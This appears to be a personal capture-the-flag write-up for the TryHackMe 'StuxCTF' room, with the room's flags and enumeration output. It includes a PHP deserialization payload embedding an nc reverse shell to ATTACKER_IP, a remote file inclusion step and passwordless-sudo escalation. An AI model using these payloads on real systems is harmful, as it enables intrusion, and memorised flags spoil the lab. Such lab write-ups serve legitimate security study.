---
cssclasses:
  - jbm-note
Date: 2026-06-19
tags:
  - THMChallenge
---
# **CVE** Challenge

| **Target** :LiTarget:            | *Try hack me machine(room:stuxctf)* |
| -------------------------------- | ----------------------------------- |
| Date :LiCalendar:                | 19/06/2026                          |
| Main attack type                 | ...                                 |
| Secondary attack type            | ...                                 |
| Tools :LiToolCase:               | NMAP, Python                        |
| Criticality :RiAlarmWarningLine: | **9**, **Critical** - ...           |

---
# **RESULTS**
---
## Flags/Tasks
### Task 1
1. User.txt?
	- *0b6044b7807dd100b9e30f1bd09db53f*
2. Root.txt?
	- *0028454003b42601548df551b738976c*
3. Hidden directory
	- *47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055*
---
# Preparation
---
## Resources
- Resources / Information provided in-room
## PHP SCRIPT
`script.php`
```php
<?php class file { public $file = 'assets/shell.php'; public $data = "<?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f') ?>"; } $serial = serialize(new file); print $serial; print("\n"); ?>
```

---
# Initial investigation/enumeration
---
## **Enumeration**
### NMAP
#### Simple scan
```bash
sudo nmap -sS -sV TARGET
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#### ALL Ports
```bash
sudo nmap -sS -p- TARGET
```
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### GOBUSTER
#### Hidden endpoint
```bash
gobuster dir -u http://TARGET/[HIDDEN_DIR] -w /usr/share/wordlists/dirb/common.txt -x js,php,html
```
```
.htpasswd.php        (Status: 403) [Size: 430]
.hta.php             (Status: 403) [Size: 425]
.htpasswd.js         (Status: 403) [Size: 429]
.htaccess.php        (Status: 403) [Size: 430]
.htaccess            (Status: 403) [Size: 426]
.htaccess.js         (Status: 403) [Size: 429]
.htpasswd            (Status: 403) [Size: 426]
.hta.js              (Status: 403) [Size: 424]
.htaccess.html       (Status: 403) [Size: 431]
.hta                 (Status: 403) [Size: 421]
.hta.html            (Status: 403) [Size: 426]
.htpasswd.html       (Status: 403) [Size: 431]
assets               (Status: 301) [Size: 444] [--> http://TARGET/[HIDDEN_DIR]/assets/]
index.php            (Status: 200) [Size: 1168]
```

## **Vulnerability scanning**
### SQLI

---
# Exploiting and Investigation
---
## Enumerating the server
The Apache webserver on port 80 returns a website with the text `is blank....`, however there is a comment in the HTML containing the hidden directory.
```html
<!-- 
 The secret directory is...
		p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
		g: 7;
		a: 330;
		b: 450;
		g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;
-->
```
Using the hint from earlier we can input the values into the equation to find the hidden directory.
Hint: 
```
HINT: g ^ a mod p, g ^ b mod p, g ^ C mod p

first 128 characters ...
```
$$
g ^ a mod (p), g ^ b mod (p), g ^ C mod (p)
$$

The first 128 digits are the hidden directory: **`47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055`**

Visiting the directory leads to a page containing the text : `Follow the white rabbit..`, with an HTML comment containing a hint : `hint: /?file=--`

Looking for other directories nested under the hidden directory using `gobuster` reveals the `/assets/` directory. This contains a `js` folder which contains an `app.js` file containing some source code.

```js
function senddata() {
	var search = $("#search").val();
	var replace = $("#replace").val();
	var content = $("#content").val();

	if(search == "" || replace == "" || content == "") {
		$("#output").text("No input given!");
	}
	$.ajax({
		url: "ajax.php",
		data: {
			'search':search,
			'replace':replace,
			'content':content
		},
		method: 'post'
	}).success(function(data) {
		$("#output").text(data)
	}).fail(function(data) {
		$("#output").text("OOps, something went wrong...\n"+data)
	})
	return false;
}
```

## Reverse Shell
Using the hint and trying `?file=index.php` returns a *Hex* string containing a *reverse Base64* string which decodes to the source code.
`index.php`:
```php
<br />
error_reporting(0);<br />
class file {<br />
        public $file = "dump.txt";<br />
        public $data = "dump test";<br />
        function __destruct(){<br />
                file_put_contents($this->file, $this->data);<br />
        }<br />
}<br />
<br />
<br />
$file_name = $_GET['file'];<br />
if(isset($file_name) && !file_exists($file_name)){<br />
        echo "File no Exist!";<br />
}<br />
<br />
if($file_name=="index.php"){<br />
        $content = file_get_contents($file_name);<br />
        $tags = array("", "");<br />
        echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));<br />
}<br />
unserialize(file_get_contents($file_name));<br />
<br />
<!DOCTYPE html><br />
    <head><br />
        <title>StuxCTF</title><br />
	<meta charset="UTF-8"><br />
        <meta name="viewport" content="width=device-width, initial-scale=1"><br />
        <link rel="stylesheet" href="assets/css/bootstrap.min.css" /><br />
        <link rel="stylesheet" href="assets/css/style.css" /><br />
    </head><br />
        <body><br />
        <nav class="navbar navbar-default navbar-fixed-top"><br />
          <div class="container"><br />
            <div class="navbar-header"><br />
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"><br />
                <span class="sr-only">Toggle navigation</span><br />
              </button><br />
              <a class="navbar-brand" href="index.php">Home</a><br />
            </div><br />
          </div><br />
        </nav><br />
        <!-- hint: /?file= --><br />
        <div class="container"><br />
            <div class="jumbotron"><br />
				<center><br />
					<h1>Follow the white rabbit..</h1><br />
				</center><br />
            </div><br />
        </div>            <br />
        <script src="assets/js/jquery-1.11.3.min.js"></script><br />
        <script src="assets/js/bootstrap.min.js"></script><br />
    </body><br />
</html><br />
```

Using this, we can write a PHP script to input a payload:
```bash
php script.php > script.txt
```
```bash
python3 -m http.server 80
```

To access the file we can use `?file=http://ATTACKER_IP/shell.txt`, then access `.assets/shell.php` after setting up `nc -lnvp 4444`.

Running `find /home` returns a list of files from users in the `/home` directory, in this case this returns files from the user `greciea` which contains `user.txt`.

## Privilege escalation
Using python privilege escalation is easy since running `sudo` does not require a password in this server.
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```bash
www-data@ubuntu:/home/grecia$ sudo ls /root
sudo ls /root
root.txt
www-data@ubuntu:/home/grecia$ sudo cat /root/root.txt
sudo cat /root/root.txt
[ROOT_FLAG]
www-data@ubuntu:/home/grecia$ 
```